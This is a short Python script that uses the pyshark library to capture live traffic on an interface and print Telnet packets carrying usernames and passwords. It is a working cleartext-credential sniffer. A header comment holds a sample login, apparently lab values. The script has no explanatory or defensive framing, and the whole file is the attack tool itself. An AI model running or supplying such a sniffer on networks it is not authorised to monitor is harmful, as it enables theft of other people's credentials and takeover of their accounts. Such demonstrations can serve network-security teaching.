#username david password cisco
#TELNET

import pyshark

capture = pyshark.LiveCapture('eth0')
for packet in capture:
    if 'TELNET' in packet:
        try:
            output = packet.telnet
            if 'USER' in str(output):
                print('------------------------------------')
                print('USERNAME: ')
                print(output)
            elif 'PASS' in str(output):
                print('------------------------------------')
                print('PASSWORD: ')
                print(output)
            
            if packet.telnet.data:
                print(output)

        except:
            pass


